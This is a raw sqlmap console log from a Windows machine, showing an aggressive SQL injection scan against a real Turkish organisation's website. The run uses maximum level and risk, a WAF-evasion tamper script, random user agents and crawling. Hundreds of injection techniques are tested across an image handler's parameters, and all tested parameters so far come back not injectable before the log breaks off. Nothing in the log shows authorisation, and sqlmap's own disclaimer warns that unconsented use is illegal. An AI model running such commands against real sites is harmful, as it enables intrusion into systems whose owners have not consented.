C:\Users\burak\OneDrive\Masa端st端\asdas\sqlmap-dev>python sqlmap.py -u "https://www.mustso.org.tr/Default.aspx" --dbs --forms --crawl=2 --dbms=postgresql --tamper=space2comment --random-agent --time-sec=10 --level=5 --risk=3
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.8.3#dev}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:06:17 /2022-08-26/

[05:06:17] [INFO] loading tamper module 'space2comment'
[05:06:17] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.15) Gecko/20101027 Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10' from file 'C:\Users\burak\OneDrive\Masa端st端\asdas\sqlmap-dev\data\txt\user-agents.txt'
do you want to check for the existence of site's sitemap(.xml) [y/N] y
[05:06:19] [WARNING] 'sitemap.xml' not found
[05:06:19] [INFO] starting crawler for target URL 'https://www.mustso.org.tr/Default.aspx'
[05:06:19] [INFO] searching for links with depth 1
[05:06:21] [INFO] searching for links with depth 2
please enter number of threads? [Enter for 1 (current)] 1
[05:06:23] [WARNING] running in a single-thread mode. This could take a while
[05:06:38] [INFO] 29/86 links visited (34%)
[05:06:39] [WARNING] potential CAPTCHA protection mechanism detected
do you want to normalize crawling results [Y/n] y
do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] y
[05:07:25] [INFO] writing crawling results to a temporary file 'C:\Users\burak\AppData\Local\Temp\sqlmaplgm7u0bc3276\sqlmapcrawler-_ys6a8jo.csv'
[05:07:25] [INFO] found a total of 5 targets
[1/5] URL:
GET https://www.mustso.org.tr/DesktopModules/DnnForge - NewsArticles/ImageHandler.ashx?Width=990&Height=660&HomeDirectory=/Portals/348/&FileName=HaberFoto/ba%c5%9fkan ko%c3%a7, birlikle a%c5%9famayaca%c4%9f%c4%b1m%c4%b1z hi%c3%a7 bir engel yoktur (1).jpg&PortalID=348&q=1
do you want to test this URL? [Y/n/q]
> y
[05:07:34] [INFO] testing URL 'https://www.mustso.org.tr/DesktopModules/DnnForge - NewsArticles/ImageHandler.ashx?Width=990&Height=660&HomeDirectory=/Portals/348/&FileName=HaberFoto/ba%c5%9fkan ko%c3%a7, birlikle a%c5%9famayaca%c4%9f%c4%b1m%c4%b1z hi%c3%a7 bir engel yoktur (1).jpg&PortalID=348&q=1'
it appears that provided value for GET parameter 'HomeDirectory' has boundaries. Do you want to inject inside? ('/Portals/348*/') [y/N] y
[05:08:26] [INFO] using 'C:\Users\burak\AppData\Local\sqlmap\output\results-08262022_0508am.csv' as the CSV results file in multiple targets mode
you have not declared cookie(s), while server wants to set its own ('.ASPXANONYMOUS=HCzpjoLv2AE...3MzE1Njkz0'). Do you want to use those [Y/n] y
[05:08:50] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
[05:08:50] [INFO] testing if the target URL content is stable
[05:08:51] [INFO] target URL content is stable
[05:08:51] [INFO] testing if GET parameter 'Width' is dynamic
[05:08:52] [WARNING] GET parameter 'Width' does not appear to be dynamic
[05:08:54] [WARNING] heuristic (basic) test shows that GET parameter 'Width' might not be injectable
[05:08:55] [INFO] testing for SQL injection on GET parameter 'Width'
[05:08:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:09:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:10:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:11:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:12:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:12:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:12:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:13:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:13:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:13:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:13:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:13:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:13:13] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:13:13] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:13:47] [INFO] testing 'Generic inline queries'
[05:13:48] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[05:14:25] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[05:15:13] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[05:15:14] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[05:15:14] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[05:15:14] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[05:15:15] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[05:15:16] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[05:15:16] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[05:15:18] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[05:15:42] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[05:15:57] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[05:16:42] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[05:17:09] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[05:17:10] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[05:17:10] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[05:17:11] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[05:17:12] [INFO] testing 'PostgreSQL inline queries'
[05:17:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[05:17:13] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[05:17:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[05:18:18] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[05:18:33] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[05:18:58] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[05:19:13] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[05:19:39] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[05:20:25] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[05:21:25] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[05:21:49] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[05:22:09] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[05:22:40] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[05:23:15] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[05:23:36] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[05:24:07] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[05:24:08] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[05:24:09] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[05:24:10] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[05:24:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:26:44] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[05:28:33] [WARNING] GET parameter 'Width' does not seem to be injectable
[05:28:33] [INFO] testing if GET parameter 'Height' is dynamic
[05:28:34] [WARNING] GET parameter 'Height' does not appear to be dynamic
[05:28:35] [WARNING] heuristic (basic) test shows that GET parameter 'Height' might not be injectable
[05:28:36] [INFO] testing for SQL injection on GET parameter 'Height'
[05:28:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:29:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:30:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:30:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:31:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:31:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:32:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:32:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:32:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:32:28] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:32:28] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:32:28] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:32:29] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:32:29] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:33:00] [INFO] testing 'Generic inline queries'
[05:33:01] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[05:33:33] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[05:34:15] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[05:34:16] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[05:34:16] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[05:34:16] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[05:34:17] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[05:34:18] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[05:34:18] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[05:34:19] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[05:34:58] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[05:35:14] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[05:36:00] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[05:36:32] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[05:36:33] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[05:36:33] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[05:36:35] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[05:36:36] [INFO] testing 'PostgreSQL inline queries'
[05:36:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[05:36:58] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[05:37:30] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[05:37:44] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[05:38:14] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[05:38:29] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[05:38:52] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[05:39:23] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[05:40:04] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[05:40:36] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[05:41:07] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[05:41:46] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[05:42:39] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[05:43:07] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[05:43:27] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[05:43:28] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[05:43:28] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[05:43:29] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[05:43:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:44:32] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[05:45:22] [WARNING] GET parameter 'Height' does not seem to be injectable
[05:45:22] [INFO] testing if GET parameter 'HomeDirectory' is dynamic
[05:45:23] [WARNING] GET parameter 'HomeDirectory' does not appear to be dynamic
[05:45:23] [WARNING] heuristic (basic) test shows that GET parameter 'HomeDirectory' might not be injectable
[05:45:23] [INFO] testing for SQL injection on GET parameter 'HomeDirectory'
[05:45:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:46:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:47:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:47:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:48:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:49:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:49:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:49:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:49:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:49:57] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:49:57] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:49:57] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:49:58] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:49:58] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:50:37] [INFO] testing 'Generic inline queries'
[05:50:38] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[05:51:42] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[05:52:27] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[05:52:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[05:52:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[05:52:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[05:52:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[05:52:30] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[05:52:30] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[05:52:32] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[05:53:03] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[05:53:26] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[05:53:43] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[05:54:17] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[05:54:17] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[05:54:17] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[05:54:18] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[05:54:18] [INFO] testing 'PostgreSQL inline queries'
[05:54:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[05:54:34] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[05:55:09] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[05:55:25] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[05:55:52] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[05:56:15] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[05:56:42] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[05:57:14] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[05:57:37] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[05:57:48] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[05:58:08] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[05:58:46] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[05:59:23] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[05:59:45] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[06:00:10] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[06:00:10] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[06:00:11] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[06:00:11] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[06:00:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[06:00:59] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[06:01:30] [WARNING] GET parameter 'HomeDirectory' does not seem to be injectable
[06:01:30] [INFO] testing if GET parameter 'FileName' is dynamic
[06:01:30] [WARNING] GET parameter 'FileName' does not appear to be dynamic
[06:01:30] [WARNING] heuristic (basic) test shows that GET parameter 'FileName' might not be injectable
[06:01:31] [INFO] testing for SQL injection on GET parameter 'FileName'
[06:01:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:02:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[06:03:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[06:04:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:05:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:05:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[06:05:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[06:06:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[06:06:14] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[06:06:14] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[06:06:15] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[06:06:15] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[06:06:16] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[06:06:17] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[06:07:11] [INFO] testing 'Generic inline queries'
[06:07:11] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[06:08:08] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[06:09:04] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[06:09:05] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[06:09:06] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[06:09:07] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[06:09:15] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[06:09:16] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[06:09:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[06:09:26] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[06:10:02] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[06:10:37] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[06:11:11] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[06:11:33] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[06:11:33] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[06:11:33] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[06:11:34] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[06:11:42] [INFO] testing 'PostgreSQL inline queries'
[06:11:42] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[06:11:49] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[06:12:02] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[06:12:24] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[06:12:47] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[06:13:08] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[06:13:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[06:14:07] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[06:14:38] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[06:15:07] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[06:15:18] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[06:15:43] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[06:16:16] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[06:16:45] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[06:17:03] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[06:17:03] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[06:17:04] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[06:17:04] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[06:17:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[06:18:00] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[06:18:47] [WARNING] GET parameter 'FileName' does not seem to be injectable
[06:18:47] [INFO] testing if GET parameter 'PortalID' is dynamic
[06:18:48] [INFO] GET parameter 'PortalID' appears to be dynamic
[06:18:50] [WARNING] heuristic (basic) test shows that GET parameter 'PortalID' might not be injectable
[06:18:50] [INFO] testing for SQL injection on GET parameter 'PortalID'
[06:18:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:19:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[06:20:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[06:21:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:22:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:22:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[06:23:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[06:23:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[06:23:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[06:23:26] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[06:23:26] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[06:23:26] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[06:23:27] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[06:23:27] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[06:24:11] [INFO] testing 'Generic inline queries'
[06:24:11] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[06:24:44] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[06:25:44] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[06:25:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[06:25:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[06:25:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[06:25:46] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[06:25:47] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[06:25:47] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[06:25:49] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[06:26:12] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[06:26:29] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[06:27:08] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[06:27:40] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[06:27:41] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[06:27:41] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[06:27:43] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[06:27:44] [INFO] testing 'PostgreSQL inline queries'
[06:27:45] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[06:28:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[06:28:25] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[06:28:39] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[06:29:03] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[06:29:43] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[06:30:06] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[06:30:37] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[06:31:07] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[06:31:27] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[06:31:48] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[06:32:52] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[06:33:29] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[06:34:07] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[06:34:27] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[06:34:28] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[06:34:28] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[06:34:29] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[06:34:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[06:35:24] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[06:36:23] [WARNING] GET parameter 'PortalID' does not seem to be injectable
[06:36:23] [INFO] testing if GET parameter 'q' is dynamic
[06:36:24] [WARNING] GET parameter 'q' does not appear to be dynamic
[06:36:25] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
[06:36:25] [INFO] testing for SQL injection on GET parameter 'q'
[06:36:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:37:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[06:38:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[06:38:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:39:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:39:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[06:40:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[06:40:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[06:40:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[06:40:29] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[06:40:30] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[06:40:30] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[06:40:30] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[06:40:30] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[06:41:00] [INFO] testing 'Generic inline queries'
[06:41:01] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[06:41:41] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[06:42:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[06:42:29] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[06:42:29] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[06:42:29] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
